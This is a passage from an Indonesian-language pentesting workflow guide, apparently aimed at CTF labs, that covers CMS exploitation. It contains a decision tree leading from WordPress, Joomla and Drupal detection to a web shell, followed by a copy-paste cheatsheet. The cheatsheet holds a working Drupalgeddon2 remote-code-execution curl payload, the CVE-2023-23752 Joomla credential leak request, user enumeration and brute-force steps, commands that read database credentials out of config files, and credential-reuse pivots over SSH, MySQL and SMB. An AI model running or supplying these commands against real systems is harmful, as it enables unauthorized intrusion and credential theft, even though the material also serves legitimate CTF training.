# Di webshell, cek fungsi yang disabled
<?php print_r(ini_get('disable_functions')); ?>

# Bypass via bypass tool
# Google: "disable_functions bypass chankro" atau "LD_PRELOAD bypass"
# → ke <a href="/docs/command-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">26_command_injection_workflow.md</a> untuk teknik bypass lebih lanjut
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Web App Ditemukan dari Nmap/File 15-16
│
├─ FASE 0: Konfirmasi port + setup /etc/hosts
│
├─ FASE 1: Triple Detection (WhatWeb + CMSeeK + curl)
│   ├─ [WordPress] → FASE 2A
│   ├─ [Joomla]    → FASE 2B
│   ├─ [Drupal]    → FASE 2C
│   ├─ [Strapi]    → FASE 2D.1 → CVE-2019-18818/19609
│   ├─ [Ghost]     → FASE 2D.2
│   └─ [Unknown]   → Manual path check → favicon hash
│
├─ FASE 2A: WORDPRESS
│   ├─ [WPScan enum] → Plugin vuln ditemukan?
│   │   ├─ [YA: Pre-auth plugin RCE] → Upload shell → SHELL
│   │   └─ [TIDAK] → User enumeration → Brute force
│   ├─ [Login berhasil] → Theme editor / Plugin upload → SHELL
│   └─ [XML-RPC aktif] → Multicall brute force (cepat)
│
├─ FASE 2B: JOOMLA
│   ├─ [Joomla 4.x] → CVE-2023-23752 API leak → DB creds
│   ├─ [Joomla 3.7] → CVE-2017-8917 SQLi
│   └─ [Login berhasil] → Template edit → SHELL
│
├─ FASE 2C: DRUPAL
│   ├─ [< 7.58 / 8.x < 8.5.1] → Drupalgeddon2 pre-auth RCE → SHELL
│   ├─ [8.x < 8.6.10] → Drupalgeddon3 REST RCE → SHELL
│   ├─ [< 7.32] → Drupalgeddon1 SQLi → Create admin → SHELL
│   └─ [Login berhasil] → PHP Filter module → SHELL
│
└─ FASE 3: Post-Exploitation
    ├─ [Config files] → DB creds → MySQL → Crack hashes
    ├─ [Creds reuse] → SSH/WinRM → ke file 06/12
    └─ [Shell stabil] → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"
export TARGET_URL="http://10.10.11.200"
export LHOST="10.10.14.5"; export LPORT="4444"
mkdir -p ~/cms_loot/{files,creds,shells,scans}

# === DETECTION ===
whatweb -a 3 $TARGET_URL -v
python3 /opt/cmseek/cmseek.py -u $TARGET_URL --batch
curl -s -I $TARGET_URL | grep -Ei "set-cookie|x-generator|x-powered-by"
curl -s $TARGET_URL | grep -i 'meta name="generator"'

# === WORDPRESS ===
wpscan --url $TARGET_URL --enumerate u,vp --detection-mode aggressive --api-token TOKEN
curl -s $TARGET_URL/wp-json/wp/v2/users | jq -r '.[].slug'     # User enum REST API
for i in {1..5}; do curl -sI "$TARGET_URL/?author=$i" | grep Location; done  # Author enum
curl -s $TARGET_URL/xmlrpc.php                                   # Cek XML-RPC aktif
curl -s $TARGET_URL/feed/ | grep -o 'wordpress\.org/?v=[0-9.]*' # Versi via RSS

# === JOOMLA ===
joomscan -u $TARGET_URL
curl -s "$TARGET_URL/administrator/manifests/files/joomla.xml" | grep "<version>"  # Versi
curl -s "$TARGET_URL/api/index.php/v1/config/application?public=true" | jq .      # CVE-2023-23752

# === DRUPAL ===
droopescan scan drupal -u $TARGET_URL -t 32
curl -s $TARGET_URL/CHANGELOG.txt | head -5                      # Versi
# Drupalgeddon2 PoC (Drupal 8.x)
curl -s -k -X POST "$TARGET_URL/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

# === POST EXPLOIT — CONFIG FILES ===
cat /var/www/html/wp-config.php | grep -E "DB_"                 # WordPress DB creds
cat /var/www/html/configuration.php | grep -E "password|user"   # Joomla DB creds
cat /var/www/html/sites/default/settings.php | grep -A5 "database" # Drupal DB creds

# === CROSS SERVICE PIVOT ===
# Setelah dapat creds dari CMS:
nxc ssh $TARGET -u $DB_USER -p $DB_PASS          # → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
nxc mysql $TARGET -u $DB_USER -p $DB_PASS        # → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
nxc smb $TARGET -u $DB_USER -p $DB_PASS          # → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
```

---

> **➡️ NEXT:** Setelah CMS detection dan web shell didapat, lanjut ke:
> 
> - **[🛡️ 17a. WordPress Advanced Exploitation & Workflow Guide](/docs/wordpress)** — WordPress exploitation lanjutan (WAF bypass, advanced persistence)
> - **[📘 17b — Joomla Workflow: Deep Dive untuk CTF](/docs/joomla)** — Joomla exploitation detail
> - **[💧 File 17c: Drupal Pentesting & Exploitation Workflow](/docs/drupal-cms)** — Drupal exploitation detail
> - **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** — Privesc setelah dapat www-data shell
> - **[14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql)** — Jika DB credentials ditemukan